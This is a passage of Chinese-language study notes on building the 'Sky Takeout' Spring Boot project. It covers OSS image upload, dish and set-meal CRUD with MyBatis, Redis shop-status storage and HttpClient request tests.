setCreateUser.invoke(entity,currentId); setUpdateTime.invoke(entity,now); setUpdateUser.invoke(entity,currentId); } catch (Exception e) { e.printStackTrace(); } }else if(operationType == OperationType.UPDATE){ //为2个公共字段赋值 try { Method setUpdateTime = entity.getClass().getDeclaredMethod(AutoFillConstant.SET_UPDATE_TIME, LocalDateTime.class); Method setUpdateUser = entity.getClass().getDeclaredMethod(AutoFillConstant.SET_UPDATE_USER, Long.class); //通过反射为对象属性赋值 setUpdateTime.invoke(entity,now); setUpdateUser.invoke(entity,currentId); } catch (Exception e) { e.printStackTrace(); } } } 菜品管理 文件上传的配置 实现图片的上传、多表操作\n文件上传 使用阿里云的 OSS 配置 application-dev.yml\n1 2 3 4 5 6 sky: alioss: endpoint: oss-cn-hangzhou.aliyuncs.com access-key-id: ... access-key-secret: ... bucket-name: sky-takeout-calendar application.yml\n1 2 3 4 5 6 7 8 9 spring: profiles: active: dev #设置环境 sky: alioss: endpoint: ${sky.alioss.endpoint} access-key-id: ${sky.alioss.access-key-id} access-key-secret: ${sky.alioss.access-key-secret} bucket-name: ${sky.alioss.bucket-name} 读取配置\n1 2 3 4 5 6 7 8 9 10 11 12 // sky-commom/com.sky.properties package com.sky.properties; @Component @ConfigurationProperties(prefix = \u0026#34;sky.alioss\u0026#34;) @Data public class AliOssProperties { private String endpoint; private String accessKeyId; private String accessKeySecret; private String bucketName; } 配置类，用于生成 OSS 工具类对象\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // sky-server/com.sky.config package com.sky.config; /** * 配置类，用于创建AliOssUtil对象 */ @Configuration @Slf4j public class OssConfiguration { @Bean @ConditionalOnMissingBean public AliOssUtil aliOssUtil(AliOssProperties aliOssProperties){ log.info(\u0026#34;开始创建阿里云文件上传工具类对象：{}\u0026#34;,aliOssProperties); return new AliOssUtil(aliOssProperties.getEndpoint(), aliOssProperties.getAccessKeyId(), aliOssProperties.getAccessKeySecret(), aliOssProperties.getBucketName()); } } AliOssUtil 在 sky-common 中定义\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 package com.sky.utils; @Data @AllArgsConstructor @Slf4j public class AliOssUtil { private String endpoint; private String accessKeyId; private String accessKeySecret; private String bucketName; /** * 文件上传 */ public String upload(byte[] bytes, String objectName) { // 创建OSSClient实例。 OSS ossClient = new OSSClientBuilder().build(endpoint, accessKeyId, accessKeySecret); try { // 创建PutObject请求。 ossClient.putObject(bucketName, objectName, new ByteArrayInputStream(bytes)); } catch (OSSException oe) { System.out.println(\u0026#34;Caught an OSSException, which means your request made it to OSS, \u0026#34; + \u0026#34;but was rejected with an error response for some reason.\u0026#34;); System.out.println(\u0026#34;Error Message:\u0026#34; + oe.getErrorMessage()); System.out.println(\u0026#34;Error Code:\u0026#34; + oe.getErrorCode()); System.out.println(\u0026#34;Request ID:\u0026#34; + oe.getRequestId()); System.out.println(\u0026#34;Host ID:\u0026#34; + oe.getHostId()); } catch (ClientException ce) { System.out.println(\u0026#34;Caught an ClientException, which means the client encountered \u0026#34; + \u0026#34;a serious internal problem while trying to communicate with OSS, \u0026#34; + \u0026#34;such as not being able to access the network.\u0026#34;); System.out.println(\u0026#34;Error Message:\u0026#34; + ce.getMessage()); } finally { if (ossClient != null) { ossClient.shutdown(); } } //文件访问路径规则 https://BucketName.Endpoint/ObjectName StringBuilder stringBuilder = new StringBuilder(\u0026#34;https://\u0026#34;); stringBuilder .append(bucketName) .append(\u0026#34;.\u0026#34;) .append(endpoint) .append(\u0026#34;/\u0026#34;) .append(objectName); log.info(\u0026#34;文件上传到:{}\u0026#34;, stringBuilder.toString()); return stringBuilder.toString(); } } 用 putobject 上传，然后捕获异常、回显上传路径\nCommonController 接口\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 package com.sky.controller.admin; /** * 通用接口 */ @RestController @RequestMapping(\u0026#34;/admin/common\u0026#34;) @Api(tags = \u0026#34;通用接口\u0026#34;) @Slf4j public class CommonController { @Autowired private AliOssUtil aliOssUtil; /** * 文件上传 * @param file * @return */ @PostMapping(\u0026#34;/upload\u0026#34;) @ApiOperation(\u0026#34;文件上传\u0026#34;) public Result\u0026lt;String\u0026gt; upload(MultipartFile file){ log.info(\u0026#34;文件上传：{}\u0026#34;,file); try { //原始文件名 String originalFilename = file.getOriginalFilename(); //截取原始文件名的后缀 dfdfdf.png String extension = originalFilename.substring(originalFilename.lastIndexOf(\u0026#34;.\u0026#34;)); //构造新文件名称 String objectName = UUID.randomUUID().toString() + extension; //文件的请求路径 String filePath = aliOssUtil.upload(file.getBytes(), objectName); return Result.success(filePath); } catch (IOException e) { log.error(\u0026#34;文件上传失败：{}\u0026#34;, e); } return Result.error(MessageConstant.UPLOAD_FAILED); } } 新增菜品 多表操作、批量添加的处理\nController 注意：注入的注解是 @RequiredArgsConstructor，且用 private final 1 2 3 4 5 6 7 8 @PostMapping @ApiOperation(\u0026#34;新增菜品\u0026#34;) public Result save(@RequestBody DishDTO dishDTO) { log.info(\u0026#34;新增菜品：{}\u0026#34;, dishDTO); dishService.saveWithFlavor(dishDTO);//后绪步骤开发 return Result.success(); } } Service 用事务解决同步性问题 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 package com.sky.service.impl; @Service @Slf4j public class DishServiceImpl implements DishService { @Autowired private DishMapper dishMapper; @Autowired private DishFlavorMapper dishFlavorMapper; /** * 新增菜品和对应的口味 * * @param dishDTO */ @Transactional public void saveWithFlavor(DishDTO dishDTO) { Dish dish = new Dish(); BeanUtils.copyProperties(dishDTO, dish); //向菜品表插入1条数据 dishMapper.insert(dish);//后绪步骤实现 //获取insert语句生成的主键值 Long dishId = dish.getId(); // ！！！批量插入数据 List\u0026lt;DishFlavor\u0026gt; flavors = dishDTO.getFlavors(); if (flavors != null \u0026amp;\u0026amp; flavors.size() \u0026gt; 0) { flavors.forEach(dishFlavor -\u0026gt; { dishFlavor.setDishId(dishId); }); //向口味表插入n条数据 dishFlavorMapper.insertBatch(flavors);//后绪步骤实现 } } } Mapper 主要看 insetBatch，用 foreach 遍历 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; ?\u0026gt; \u0026lt;!DOCTYPE mapper PUBLIC \u0026#34;-//mybatis.org//DTD Mapper 3.0//EN\u0026#34; \u0026#34;http://mybatis.org/dtd/mybatis-3-mapper.dtd\u0026#34; \u0026gt; \u0026lt;mapper namespace=\u0026#34;com.sky.mapper.DishFlavorMapper\u0026#34;\u0026gt; \u0026lt;insert id=\u0026#34;insertBatch\u0026#34;\u0026gt; insert into dish_flavor (dish_id, name, value) VALUES \u0026lt;foreach collection=\u0026#34;flavors\u0026#34; item=\u0026#34;df\u0026#34; separator=\u0026#34;,\u0026#34;\u0026gt; (#{df.dishId},#{df.name},#{df.value}) \u0026lt;/foreach\u0026gt; \u0026lt;/insert\u0026gt; \u0026lt;/mapper\u0026gt; 菜品分页查询 类似前面的分页查询，但是新增了多表查询\nController 1 2 3 4 5 6 7 @GetMapping(\u0026#34;/page\u0026#34;) @ApiOperation(value = \u0026#34;菜品分页查询\u0026#34;) public Result\u0026lt;PageResult\u0026gt; page(DishPageQueryDTO dishPageQueryDTO){ log.info(\u0026#34;菜品分页查询{}\u0026#34;,dishPageQueryDTO); PageResult pageResult = dishService.page(dishPageQueryDTO); return Result.success(pageResult); } Service 1 2 3 4 5 6 7 8 9 10 11 @Override public PageResult page(DishPageQueryDTO dishPageQueryDTO) { PageHelper.startPage(dishPageQueryDTO.getPage(),dishPageQueryDTO.getPageSize()); Page\u0026lt;DishVO\u0026gt; records = dishMapper.page(dishPageQueryDTO); Long total = records.getTotal(); List\u0026lt;DishVO\u0026gt; dishVOS = records.getResult(); PageResult pageResult = new PageResult(); pageResult.setTotal(total); pageResult.setRecords(dishVOS); return pageResult; } Mapper 注意多表查询 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;select id=\u0026#34;pageQuery\u0026#34; resultType=\u0026#34;com.sky.vo.DishVO\u0026#34;\u0026gt; select d.* , c.name as categoryName from dish d left outer join category c on d.category_id = c.id \u0026lt;where\u0026gt; \u0026lt;if test=\u0026#34;name != null\u0026#34;\u0026gt; and d.name like concat(\u0026#39;%\u0026#39;,#{name},\u0026#39;%\u0026#39;) \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;categoryId != null\u0026#34;\u0026gt; and d.category_id = #{categoryId} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;status != null\u0026#34;\u0026gt; and d.status = #{status} \u0026lt;/if\u0026gt; \u0026lt;/where\u0026gt; order by d.create_time desc \u0026lt;/select\u0026gt; 删除菜品 涉及较复杂的多表关联删除操作\n业务规则：\n可以一次删除一个菜品，也可以批量删除菜品 起售中的菜品不能删除 被套餐关联的菜品不能删除 删除菜品后，关联的口味数据也需要删除掉 菜品的返回需要包装一个 VO 类\nController 1 2 3 4 5 6 7 @DeleteMapping @ApiOperation(\u0026#34;菜品批量删除\u0026#34;) public Result delete(@RequestParam List\u0026lt;Long\u0026gt; ids) { log.info(\u0026#34;菜品批量删除：{}\u0026#34;, ids); dishService.deleteBatch(ids);//后绪步骤实现 return Result.success(); } Service 注意判断逻辑 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 @Transactional//事务 public void deleteBatch(List\u0026lt;Long\u0026gt; ids) { //判断当前菜品是否能够删除---是否存在起售中的菜品？？ for (Long id : ids) { Dish dish = dishMapper.getById(id);//后绪步骤实现 if (dish.getStatus() == StatusConstant.ENABLE) { //当前菜品处于起售中，不能删除 throw new DeletionNotAllowedException(MessageConstant.DISH_ON_SALE); } } //判断当前菜品是否能够删除---是否被套餐关联了？？ List\u0026lt;Long\u0026gt; setmealIds = setmealDishMapper.getSetmealIdsByDishIds(ids); if (setmealIds != null \u0026amp;\u0026amp; setmealIds.size() \u0026gt; 0) { //当前菜品被套餐关联了，不能删除 throw new DeletionNotAllowedException(MessageConstant.DISH_BE_RELATED_BY_SETMEAL); } //删除菜品表中的菜品数据 for (Long id : ids) { dishMapper.deleteById(id);//后绪步骤实现 //删除菜品关联的口味数据 dishFlavorMapper.deleteByDishId(id);//后绪步骤实现 } } Mapper 注意删除多个 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; ?\u0026gt; \u0026lt;!DOCTYPE mapper PUBLIC \u0026#34;-//mybatis.org//DTD Mapper 3.0//EN\u0026#34; \u0026#34;http://mybatis.org/dtd/mybatis-3-mapper.dtd\u0026#34; \u0026gt; \u0026lt;mapper namespace=\u0026#34;com.sky.mapper.SetmealDishMapper\u0026#34;\u0026gt; \u0026lt;select id=\u0026#34;getSetmealIdsByDishIds\u0026#34; resultType=\u0026#34;java.lang.Long\u0026#34;\u0026gt; select setmeal_id from setmeal_dish where dish_id in \u0026lt;foreach collection=\u0026#34;dishIds\u0026#34; item=\u0026#34;dishId\u0026#34; separator=\u0026#34;,\u0026#34; open=\u0026#34;(\u0026#34; close=\u0026#34;)\u0026#34;\u0026gt; #{dishId} \u0026lt;/foreach\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;/mapper\u0026gt; 异常类编写：\n1 2 3 4 5 6 7 package com.sky.exception; public class DeletionNotAllowedException extends BaseException { public DeletionNotAllowedException(String msg) { super(msg); } } 修改菜品 查询 需要将 flavor 也添加进去 \u0026ndash;\u0026gt; 需要新的 VO 来存储\nController 1 2 3 4 5 6 7 @GetMapping(\u0026#34;/{id}\u0026#34;) @ApiOperation(\u0026#34;根据id查询菜品\u0026#34;) public Result\u0026lt;DishVO\u0026gt; getById(@PathVariable Long id) { log.info(\u0026#34;根据id查询菜品：{}\u0026#34;, id); DishVO dishVO = dishService.getByIdWithFlavor(id);//后绪步骤实现 return Result.success(dishVO); } Service 1 2 3 4 5 6 7 8 9 10 11 12 13 14 public DishVO getByIdWithFlavor(Long id) { //根据id查询菜品数据 Dish dish = dishMapper.getById(id); //根据菜品id查询口味数据 List\u0026lt;DishFlavor\u0026gt; dishFlavors = dishFlavorMapper.getByDishId(id);//后绪步骤实现 //将查询到的数据封装到VO DishVO dishVO = new DishVO(); BeanUtils.copyProperties(dish, dishVO); dishVO.setFlavors(dishFlavors); return dishVO; } Mapper 1 2 @Select(\u0026#34;select * from dish_flavor where dish_id = #{dishId}\u0026#34;) List\u0026lt;DishFlavor\u0026gt; getByDishId(Long dishId); 修改 Controller 1 2 3 4 5 6 7 @PutMapping @ApiOperation(\u0026#34;修改菜品\u0026#34;) public Result update(@RequestBody DishDTO dishDTO) { log.info(\u0026#34;修改菜品：{}\u0026#34;, dishDTO); dishService.updateWithFlavor(dishDTO); return Result.success(); } Service 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public void updateWithFlavor(DishDTO dishDTO) { Dish dish = new Dish(); BeanUtils.copyProperties(dishDTO, dish); //修改菜品表基本信息 dishMapper.update(dish); //删除原有的口味数据 dishFlavorMapper.deleteByDishId(dishDTO.getId()); //重新插入口味数据 List\u0026lt;DishFlavor\u0026gt; flavors = dishDTO.getFlavors(); if (flavors != null \u0026amp;\u0026amp; flavors.size() \u0026gt; 0) { flavors.forEach(dishFlavor -\u0026gt; { dishFlavor.setDishId(dishDTO.getId()); }); //向口味表插入n条数据 dishFlavorMapper.insertBatch(flavors); } } Mapper 注意更新的编写，if test 标签 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;update id=\u0026#34;update\u0026#34;\u0026gt; update dish \u0026lt;set\u0026gt; \u0026lt;if test=\u0026#34;name != null\u0026#34;\u0026gt;name = #{name},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;categoryId != null\u0026#34;\u0026gt;category_id = #{categoryId},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;price != null\u0026#34;\u0026gt;price = #{price},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;image != null\u0026#34;\u0026gt;image = #{image},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;description != null\u0026#34;\u0026gt;description = #{description},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;status != null\u0026#34;\u0026gt;status = #{status},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;updateTime != null\u0026#34;\u0026gt;update_time = #{updateTime},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;updateUser != null\u0026#34;\u0026gt;update_user = #{updateUser},\u0026lt;/if\u0026gt; \u0026lt;/set\u0026gt; where id = #{id} \u0026lt;/update\u0026gt; 套餐管理 新增套餐 首先需要新增根据套餐类型查询菜品，回显 注意返回值！ 1 2 3 4 5 6 7 8 // DishController @GetMapping(\u0026#34;/list\u0026#34;) @ApiOperation(value = \u0026#34;根据分类id查询菜品\u0026#34;) public Result\u0026lt;List\u0026lt;DishVO\u0026gt;\u0026gt; getByCategoryId(@RequestParam Long categoryId){ log.info(\u0026#34;根据分类id查询菜品{}\u0026#34;,categoryId); List\u0026lt;DishVO\u0026gt; dishVOS = dishService.getByCategoryId(categoryId); return Result.success(dishVOS); } 然后正常添加 setmeal 的 insert 即可 套餐分页查询 类似地，多了参数，多写几个 if test 就可以了\n注意，Page\u0026lt;Setmeal\u0026gt; records = setmealMapper.pageQuerySetmeal(setmealPageQueryDTO);，返回的不是 page 对象…… 删除套餐 sql 不会写： 接收参数要用 @RequestParam List\u0026lt;Long\u0026gt; ids 绑定参数、参数可选、数组参数 1 2 3 4 5 6 \u0026lt;delete id=\u0026#34;deleteSetmeals\u0026#34;\u0026gt; delete from setmeal where id in \u0026lt;foreach collection=\u0026#34;ids\u0026#34; item=\u0026#34;id\u0026#34; open=\u0026#34;(\u0026#34; close=\u0026#34;)\u0026#34; separator=\u0026#34;,\u0026#34;\u0026gt; #{id} \u0026lt;/foreach\u0026gt; \u0026lt;/delete\u0026gt; 修改套餐 update 语句还不太会写\n参数还是要用 @RequestBody 接收\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;update id=\u0026#34;update\u0026#34;\u0026gt; update setmeal \u0026lt;set\u0026gt; \u0026lt;if test=\u0026#34;categoryId != null\u0026#34;\u0026gt;category_id = #{categoryId},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;description != null and description != \u0026#39;\u0026#39;\u0026#34;\u0026gt;description = #{description},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;image != null and image != \u0026#39;\u0026#39;\u0026#34;\u0026gt;image = #{image},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;name != null and name != \u0026#39;\u0026#39;\u0026#34;\u0026gt;name = #{name},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;price != null\u0026#34;\u0026gt;price = #{price},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;status != null\u0026#34;\u0026gt;status = #{status},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;updateTime != null\u0026#34;\u0026gt;update_time = #{updateTime},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;updateUser != null\u0026#34;\u0026gt;update_user = #{updateUser}\u0026lt;/if\u0026gt; \u0026lt;/set\u0026gt; where id = #{id} \u0026lt;/update\u0026gt; 启用、禁用套餐 没什么问题\nRedis - 店铺营业状态 docker 部署\n1 2 3 4 5 6 7 docker run -d \\ --name redis-4.0.0 \\ -p 6379:6379 \\ -v /root/docker/redis/data:/data \\ -v /root/docker/redis/conf/redis.conf:/etc/redis/redis.conf \\ redis:4.0.0 \\ redis-server /etc/redis/redis.conf Spring Data Redis 的使用 配置 导入maven坐标 1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-data-redis\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 配置 dev.yml,并导入到 application.tml 中 1 2 3 4 5 6 7 8 spring: profiles: active: dev redis: host: ${sky.redis.host} port: ${sky.redis.port} password: ${sky.redis.password} database: ${sky.redis.database} 配置类 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package com.sky.config; @Configuration @Slf4j public class RedisConfiguration { @Bean public RedisTemplate redisTemplate(RedisConnectionFactory redisConnectionFactory){ log.info(\u0026#34;开始创建redis模板对象...\u0026#34;); RedisTemplate redisTemplate = new RedisTemplate(); //设置redis的连接工厂对象 redisTemplate.setConnectionFactory(redisConnectionFactory); //设置redis key的序列化器 redisTemplate.setKeySerializer(new StringRedisSerializer()); return redisTemplate; } } Spring Boot 内置了 RedisAutoConfiguration 自动配置类，会根据 application.yml 中的 spring.redis 前缀配置，自动创建 RedisConnectionFactory 实例\n当前配置类不是必须的，因为 Spring Boot 框架会自动装配 RedisTemplate 对象，但是默认的key序列化器为 JdkSerializationRedisSerializer，导致我们存到 Redis 中后的数据和原始数据有差别，故设置为 StringRedisSerializer 序列化器。\n通过配置类操作 Redis 字符串型 1 2 3 4 5 6 7 8 9 10 11 12 /** * 操作字符串类型的数据 */ public void testString(){ // set get setex setnx redisTemplate.opsForValue().set(\u0026#34;name\u0026#34;,\u0026#34;小明\u0026#34;); String city = (String) redisTemplate.opsForValue().get(\u0026#34;name\u0026#34;); System.out.println(city); redisTemplate.opsForValue().set(\u0026#34;code\u0026#34;,\u0026#34;1234\u0026#34;,3, TimeUnit.MINUTES); redisTemplate.opsForValue().setIfAbsent(\u0026#34;lock\u0026#34;,\u0026#34;1\u0026#34;); redisTemplate.opsForValue().setIfAbsent(\u0026#34;lock\u0026#34;,\u0026#34;2\u0026#34;); } 哈希型 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 /** * 操作哈希类型的数据 */ public void testHash(){ //hset hget hdel hkeys hvals HashOperations hashOperations = redisTemplate.opsForHash(); hashOperations.put(\u0026#34;100\u0026#34;,\u0026#34;name\u0026#34;,\u0026#34;tom\u0026#34;); hashOperations.put(\u0026#34;100\u0026#34;,\u0026#34;age\u0026#34;,\u0026#34;20\u0026#34;); String name = (String) hashOperations.get(\u0026#34;100\u0026#34;, \u0026#34;name\u0026#34;); System.out.println(name); Set keys = hashOperations.keys(\u0026#34;100\u0026#34;); System.out.println(keys); List values = hashOperations.values(\u0026#34;100\u0026#34;); System.out.println(values); hashOperations.delete(\u0026#34;100\u0026#34;,\u0026#34;age\u0026#34;); } 列表类型 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 /** * 操作列表类型的数据 */ public void testList(){ //lpush lrange rpop llen ListOperations listOperations = redisTemplate.opsForList(); listOperations.leftPushAll(\u0026#34;mylist\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;b\u0026#34;,\u0026#34;c\u0026#34;); listOperations.leftPush(\u0026#34;mylist\u0026#34;,\u0026#34;d\u0026#34;); List mylist = listOperations.range(\u0026#34;mylist\u0026#34;, 0, -1); System.out.println(mylist); listOperations.rightPop(\u0026#34;mylist\u0026#34;); Long size = listOperations.size(\u0026#34;mylist\u0026#34;); System.out.println(size); } 集合类型 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 /** * 操作集合类型的数据 */ @Test public void testSet(){ //sadd smembers scard sinter sunion srem SetOperations setOperations = redisTemplate.opsForSet(); setOperations.add(\u0026#34;set1\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;b\u0026#34;,\u0026#34;c\u0026#34;,\u0026#34;d\u0026#34;); setOperations.add(\u0026#34;set2\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;b\u0026#34;,\u0026#34;x\u0026#34;,\u0026#34;y\u0026#34;); Set members = setOperations.members(\u0026#34;set1\u0026#34;); System.out.println(members); Long size = setOperations.size(\u0026#34;set1\u0026#34;); System.out.println(size); Set intersect = setOperations.intersect(\u0026#34;set1\u0026#34;, \u0026#34;set2\u0026#34;); System.out.println(intersect); Set union = setOperations.union(\u0026#34;set1\u0026#34;, \u0026#34;set2\u0026#34;); System.out.println(union); setOperations.remove(\u0026#34;set1\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;b\u0026#34;); } 有序集合类型 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 /** * 操作有序集合类型的数据 */ @Test public void testZset(){ //zadd zrange zincrby zrem ZSetOperations zSetOperations = redisTemplate.opsForZSet(); zSetOperations.add(\u0026#34;zset1\u0026#34;,\u0026#34;a\u0026#34;,10); zSetOperations.add(\u0026#34;zset1\u0026#34;,\u0026#34;b\u0026#34;,12); zSetOperations.add(\u0026#34;zset1\u0026#34;,\u0026#34;c\u0026#34;,9); Set zset1 = zSetOperations.range(\u0026#34;zset1\u0026#34;, 0, -1); System.out.println(zset1); zSetOperations.incrementScore(\u0026#34;zset1\u0026#34;,\u0026#34;c\u0026#34;,10); zSetOperations.remove(\u0026#34;zset1\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;b\u0026#34;); } 通用命令 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 /** * 通用命令操作 */ @Test public void testCommon(){ //keys exists type del Set keys = redisTemplate.keys(\u0026#34;*\u0026#34;); System.out.println(keys); Boolean name = redisTemplate.hasKey(\u0026#34;name\u0026#34;); Boolean set1 = redisTemplate.hasKey(\u0026#34;set1\u0026#34;); for (Object key : keys) { DataType type = redisTemplate.type(key); System.out.println(type.name()); } redisTemplate.delete(\u0026#34;mylist\u0026#34;); } 店铺营业状态设置 接口设计：\n设置营业状态 管理端查询营业状态 用户端查询营业状态 admin - ShopController user 类似，重名的 class 要指定 RestController 名称，否则自动装配会分辨不了 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package com.sky.controller.admin; @RestController(\u0026#34;adminShopController\u0026#34;) @RequestMapping(\u0026#34;/admin/shop\u0026#34;) @Api(tags = \u0026#34;店铺相关接口\u0026#34;) @Slf4j public class ShopController { public static final String KEY = \u0026#34;SHOP_STATUS\u0026#34;; @Autowired private RedisTemplate redisTemplate; /** * 设置店铺的营业状态 * @param status * @return */ @PutMapping(\u0026#34;/{status}\u0026#34;) @ApiOperation(\u0026#34;设置店铺的营业状态\u0026#34;) public Result setStatus(@PathVariable Integer status){ log.info(\u0026#34;设置店铺的营业状态为：{}\u0026#34;,status == 1 ? \u0026#34;营业中\u0026#34; : \u0026#34;打烊中\u0026#34;); redisTemplate.opsForValue().set(KEY,status); return Result.success(); } /** * 获取店铺的营业状态 * @return */ @GetMapping(\u0026#34;/status\u0026#34;) @ApiOperation(\u0026#34;获取店铺的营业状态\u0026#34;) public Result\u0026lt;Integer\u0026gt; getStatus(){ Integer status = (Integer) redisTemplate.opsForValue().get(KEY); log.info(\u0026#34;获取到店铺的营业状态为：{}\u0026#34;,status == 1 ? \u0026#34;营业中\u0026#34; : \u0026#34;打烊中\u0026#34;); return Result.success(status); } } 用户、管理接口分离 WebConfiguration 中配置扫描\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 @Bean public Docket docket1(){ log.info(\u0026#34;准备生成接口文档...\u0026#34;); ApiInfo apiInfo = new ApiInfoBuilder() .title(\u0026#34;苍穹外卖项目接口文档\u0026#34;) .version(\u0026#34;2.0\u0026#34;) .description(\u0026#34;苍穹外卖项目接口文档\u0026#34;) .build(); Docket docket = new Docket(DocumentationType.SWAGGER_2) .groupName(\u0026#34;管理端接口\u0026#34;) .apiInfo(apiInfo) .select() //指定生成接口需要扫描的包 .apis(RequestHandlerSelectors.basePackage(\u0026#34;com.sky.controller.admin\u0026#34;)) .paths(PathSelectors.any()) .build(); return docket; } @Bean public Docket docket2(){ log.info(\u0026#34;准备生成接口文档...\u0026#34;); ApiInfo apiInfo = new ApiInfoBuilder() .title(\u0026#34;苍穹外卖项目接口文档\u0026#34;) .version(\u0026#34;2.0\u0026#34;) .description(\u0026#34;苍穹外卖项目接口文档\u0026#34;) .build(); Docket docket = new Docket(DocumentationType.SWAGGER_2) .groupName(\u0026#34;用户端接口\u0026#34;) .apiInfo(apiInfo) .select() //指定生成接口需要扫描的包 .apis(RequestHandlerSelectors.basePackage(\u0026#34;com.sky.controller.user\u0026#34;)) .paths(PathSelectors.any()) .build(); return docket; } HttpClient HttpClient作用：\n发送HTTP请求 接收响应数据 使用扫描支付、查看地图、获取验证码、查看天气等功能 导入坐标 1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.httpcomponents\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;httpclient\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.5.13\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 核心 API\nHttpClient：Http客户端对象类型，使用该类型对象可发起Http请求。\nHttpClients：可认为是构建器，可创建HttpClient对象。\nCloseableHttpClient：实现类，实现了HttpClient接口。\nHttpGet：Get方式请求类型。\nHttpPost：Post方式请求类型。\n发送请求步骤：\n创建HttpClient对象 创建Http请求对象 调用HttpClient的execute方法发送请求 案例 get 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 @SpringBootTest public class HttpClientTest { /** * 测试通过httpclient发送GET方式的请求 */ @Test public void testGET() throws Exception{ //创建httpclient对象 CloseableHttpClient httpClient = HttpClients.createDefault(); //创建请求对象 HttpGet httpGet = new HttpGet(\u0026#34;http://localhost:8080/user/shop/status\u0026#34;); //发送请求，接受响应结果 CloseableHttpResponse response = httpClient.execute(httpGet); //获取服务端返回的状态码 int statusCode = response.getStatusLine().getStatusCode(); System.out.println(\u0026#34;服务端返回的状态码为：\u0026#34; + statusCode); HttpEntity entity = response.getEntity(); String body = EntityUtils.toString(entity); System.out.println(\u0026#34;服务端返回的数据为：\u0026#34; + body); //关闭资源 response.close(); httpClient.close(); } } post 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 /** * 测试通过httpclient发送POST方式的请求 */ @Test public void testPOST() throws Exception{ // 创建httpclient对象 CloseableHttpClient httpClient = HttpClients.createDefault(); //创建请求对象 HttpPost httpPost = new HttpPost(\u0026#34;http://localhost:8080/admin/employee/login\u0026#34;); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;username\u0026#34;,\u0026#34;admin\u0026#34;); jsonObject.put(\u0026#34;password\u0026#34;,\u0026#34;123456\u0026#34;); StringEntity entity = new StringEntity(jsonObject.toString()); //指定请求编码方式 entity.setContentEncoding(\u0026#34;utf-8\u0026#34;); //数据格式 entity.setContentType(\u0026#34;application/json\u0026#34;); httpPost.setEntity(entity); //发送请求 CloseableHttpResponse response = httpClient.execute(httpPost); //解析返回结果 int statusCode = response.getStatusLine().getStatusCode(); System.out.println(\u0026#34;响应码为：\u0026#34; + statusCode); HttpEntity entity1 = response.getEntity(); String body = EntityUtils.toString(entity1); System.out.println(\u0026#34;响应数据为：\u0026#34; + body); //关闭资源 response.close(); httpClient.close(); } 微信小程序开发 小程序目录结构 小程序包含一个描述整体程序的 app 和多个描述各自页面的 